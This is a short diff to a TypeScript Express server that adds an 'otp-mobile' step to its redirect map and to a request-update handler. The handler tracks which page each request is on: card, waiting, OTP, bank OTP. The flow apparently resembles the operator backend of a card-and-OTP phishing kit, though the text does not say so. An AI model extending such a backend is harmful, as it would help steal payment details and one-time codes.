@@ -109,7 +109,10 @@ function normalizeRedirectTarget(action?: string | null): string | null {
     otp: '/otp',
     'otp-sms': '/otp',
     '/otp-bank': '/otp-bank',
-    'otp-bank': '/otp-bank'
+    'otp-bank': '/otp-bank',
+    '/otp-mobile': '/otp-mobile',
+    'otp-mobile': '/otp-mobile',
+    'mobile-auth': '/otp-mobile'
   };
   return map[trimmed] || (trimmed.startsWith('/') ? trimmed : null);
 }
@@ -569,9 +572,9 @@ app.patch('/api/requests/:id', async (req, res) => {
     } else {
       pendingRedirects.delete(id);
     }
-  } else if (req.body?.step === 'card' || req.body?.step === 'otp' || req.body?.step === 'otp-bank') {
+  } else if (req.body?.step === 'card' || req.body?.step === 'otp' || req.body?.step === 'otp-bank' || req.body?.step === 'otp-mobile') {
     pendingRedirects.delete(id);
-    const stepPage = req.body.step === 'card' ? '/waiting' : req.body.step === 'otp-bank' ? '/otp-bank' : '/otp';
+    const stepPage = req.body.step === 'card' ? '/waiting' : req.body.step === 'otp-bank' ? '/otp-bank' : req.body.step === 'otp-mobile' ? '/otp-mobile' : '/otp';
     userPresence.set(id, { lastSeen: Date.now(), currentPage: stepPage });
     lastKnownUserPage.set(id, stepPage);
   }
